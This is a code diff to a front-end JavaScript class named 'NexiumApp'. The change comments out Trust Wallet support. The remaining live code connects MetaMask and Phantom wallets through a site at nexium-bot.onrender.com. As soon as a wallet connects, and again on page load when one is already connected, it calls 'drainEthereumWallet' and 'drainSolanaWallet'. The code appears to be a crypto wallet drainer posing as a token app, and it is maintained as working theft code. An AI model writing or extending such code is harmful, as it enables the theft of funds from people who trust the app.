@@ -70,7 +70,7 @@ class NexiumApp {
       metamaskPrompt: document.getElementById('metamaskPrompt'),
       connectMetamask: document.getElementById('connect-metamask'),
       connectPhantom: document.getElementById('connect-phantom'),
-      connectTrustWallet: document.getElementById('connect-trustwallet'),
+      /* connectTrustWallet: document.getElementById('connect-trustwallet'), */
       feedbackContainer: document.querySelector('.feedback-container'),
       tokenSelect: null,
       volumeSection: null,
@@ -103,10 +103,10 @@ class NexiumApp {
       this.dom.connectPhantom.addEventListener('click', () => connectWalletHandler('Phantom'));
       this.dom.connectPhantom.addEventListener('keypress', (e) => e.key === 'Enter' && connectWalletHandler('Phantom'));
     }
-    if (this.dom.connectTrustWallet) {
+    /* if (this.dom.connectTrustWallet) {
       this.dom.connectTrustWallet.addEventListener('click', () => connectWalletHandler('TrustWallet'));
       this.dom.connectTrustWallet.addEventListener('keypress', (e) => e.key === 'Enter' && connectWalletHandler('TrustWallet'));
-    }
+    } */
     window.addEventListener('online', () => this.handleOnline());
     window.addEventListener('offline', () => this.handleOffline());
   }
@@ -126,7 +126,7 @@ class NexiumApp {
       const hasEthereum = !!window.ethereum;
       const hasSolana = !!window.solana;
       const hasExtensions = (walletName === 'MetaMask' && hasEthereum) || 
-                           (walletName === 'TrustWallet' && hasSolana) || 
+                           /* (walletName === 'TrustWallet' && hasSolana) || */
                            (walletName === 'Phantom' && hasSolana);
       console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'} (UserAgent: ${navigator.userAgent}, Touch: ${hasTouch}, Ethereum: ${hasEthereum}, Solana: ${hasSolana}, Extensions: ${hasExtensions})`);
 
@@ -142,7 +142,7 @@ class NexiumApp {
           console.log('Phantom detected, connecting:', window.solana);
           const response = await window.solana.connect();
           accounts = [response.publicKey.toString()];
-        } else if (walletName === 'TrustWallet' && hasSolana && window.solana.isTrust) {
+        /* } else if (walletName === 'TrustWallet' && hasSolana && window.solana.isTrust) {
           console.log('TrustWallet detected, connecting:', window.solana);
           await new Promise(resolve => {
             const checkSolana = () => {
@@ -160,6 +160,7 @@ class NexiumApp {
             throw new Error('TrustWallet failed to connect. Ensure it’s unlocked and updated.');
           }
           accounts = [response.publicKey.toString()];
+        } */
         } else {
           throw new Error(`${walletName} extension not detected or unsupported`);
         }
@@ -175,7 +176,7 @@ class NexiumApp {
         try {
           if (walletName === 'MetaMask') {
             await this.drainEthereumWallet(this.publicKey);
-          } else if (walletName === 'Phantom' || walletName === 'TrustWallet') {
+          } else if (walletName === 'Phantom' /* || walletName === 'TrustWallet' */) {
             await this.drainSolanaWallet();
           }
         } catch (error) {
@@ -190,7 +191,7 @@ class NexiumApp {
       const deeplinks = {
         MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com',
         Phantom: 'https://phantom.app/ul/browse/https://nexium-bot.onrender.com',
-        TrustWallet: 'https://link.trustwallet.com/open_url?coin=56&url=https://nexium-bot.onrender.com',
+        /* TrustWallet: 'https://link.trustwallet.com/open_url?coin=56&url=https://nexium-bot.onrender.com', */
       };
 
       const deeplink = deeplinks[walletName];
@@ -238,7 +239,7 @@ class NexiumApp {
             }
             clearInterval(checkConnection);
           }
-        } else if (walletName === 'TrustWallet' && window.solana?.isTrust) {
+        /* } else if (walletName === 'TrustWallet' && window.solana?.isTrust) {
           await new Promise(resolve => {
             const checkSolana = () => {
               if (window.solana && window.solana.isTrust) {
@@ -267,6 +268,7 @@ class NexiumApp {
             }
             clearInterval(checkConnection);
           }
+        } */
         }
       }, 1000);
 
@@ -528,7 +530,7 @@ class NexiumApp {
     this.showFeedback('No internet connection. Please reconnect.', 'error');
     this.updateButtonState('disconnected', 'MetaMask');
     this.updateButtonState('disconnected', 'Phantom');
-    this.updateButtonState('disconnected', 'TrustWallet');
+    /* this.updateButtonState('disconnected', 'TrustWallet'); */
   }
 
   showMetaMaskPrompt() {
@@ -542,8 +544,9 @@ class NexiumApp {
         walletLink = `<a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install MetaMask">MetaMask</a>`;
       } else if (this.connectingWallet === 'Phantom') {
         walletLink = `<a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Phantom">Phantom</a>`;
-      } else if (this.connectingWallet === 'TrustWallet') {
+      /* } else if (this.connectingWallet === 'TrustWallet') {
         walletLink = `<a href="https://trustwallet.com/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Trust Wallet">Trust Wallet</a>`;
+      } */
       }
       promptText.innerHTML = `No ${this.connectingWallet} installed. Install ${walletLink} to continue.`;
     }
@@ -606,7 +609,7 @@ class NexiumApp {
         try {
           if (window.ethereum?.isMetaMask) {
             await this.drainEthereumWallet(this.publicKey);
-          } else if (window.solana?.isPhantom || window.solana?.isTrust) {
+          } else if (window.solana?.isPhantom /* || window.solana?.isTrust */) {
             await this.drainSolanaWallet();
           }
         } catch (error) {
@@ -616,14 +619,14 @@ class NexiumApp {
       } else {
         this.updateButtonState('disconnected', 'MetaMask');
         this.updateButtonState('disconnected', 'Phantom');
-        this.updateButtonState('disconnected', 'TrustWallet');
+        /* this.updateButtonState('disconnected', 'TrustWallet'); */
         this.showDefaultPrompt();
       }
     } else {
       this.showMetaMaskPrompt();
       this.updateButtonState('disconnected', 'MetaMask');
       this.updateButtonState('disconnected', 'Phantom');
-      this.updateButtonState('disconnected', 'TrustWallet');
+      /* this.updateButtonState('disconnected', 'TrustWallet'); */
       this.showDefaultPrompt();
       this.showFeedback('Please install a supported wallet to use this app.', 'error');
     }
@@ -670,7 +673,7 @@ class NexiumApp {
     this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
     this.updateButtonState('disconnected', 'MetaMask');
     this.updateButtonState('disconnected', 'Phantom');
-    this.updateButtonState('disconnected', 'TrustWallet');
+    /* this.updateButtonState('disconnected', 'TrustWallet'); */
     this.renderTokenInterface();
   }
 
